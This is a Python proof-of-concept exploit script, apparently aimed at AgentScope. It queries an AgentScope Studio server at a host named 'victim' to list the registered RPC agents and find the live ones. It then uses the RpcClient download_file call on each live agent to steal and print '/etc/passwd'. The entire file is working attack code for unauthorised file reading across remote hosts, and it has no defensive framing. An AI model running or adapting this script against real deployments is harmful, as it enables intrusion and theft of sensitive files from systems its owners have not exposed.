import sys

try:
    from agentscope.rpc import RpcClient
    print('import succeeded', flush=True)
except Exception as e:
    print("Exception during import:", e, flush=True)
    sys.exit(1)

import requests

def print_red(text):
    print(f"\033[91m{text}\033[0m", flush=True)

as_studio_server = "victim:5000"
download_file = '/etc/passwd'

try:
    as_studio_url = f"http://{as_studio_server}/api/servers/all"
    print("Requesting", as_studio_url, flush=True)
    response = requests.get(as_studio_url)
    print("Status code:", response.status_code, flush=True)
    data = response.json()
    print("Raw JSON from as_studio:", data, flush=True)
except Exception as e:
    print("Exception during HTTP request:", e, flush=True)
    sys.exit(1)

alive_rpc_agent = []

if response.status_code == 200:
    try:
        data = response.json()
        for server in data:
            check_status_url = f"http://{as_studio_server}/api/servers/status/{server.get('id')}"
            status_response = requests.get(check_status_url)
            if status_response.status_code == 200:
                status_data = status_response.json()
                if status_data.get("status") != "dead":
                    print_red(f"Found a live rpc_agent: {server.get('id')} in {server.get('host')}:{server.get('port')}")
                    alive_rpc_agent.append((server.get('host'), server.get('port')))
            else:
                print_red(f"Failed to check status for server {server.get('id')}, status code: {status_response.status_code}")
    except Exception as e:
        print("Exception during processing servers:", e, flush=True)
        sys.exit(1)
else:
    print_red(f"Error: {response.status_code}")

if alive_rpc_agent:
    print_red("----- Attack rpc_agent -----")
    for host, port in alive_rpc_agent:
        print_red(f"Now attacking host: {host}, Port: {port}, will steal the {download_file} file")
        try:
            client = RpcClient(host=host, port=port)
            remote_file_path = client.download_file(download_file)
            with open(remote_file_path, 'r') as file:
                content = file.read()
            print(content, flush=True)
        except Exception as e:
            print("Exception during attack:", e, flush=True)
            sys.exit(1)
else:
    print("No live rpc_agent found.", flush=True)
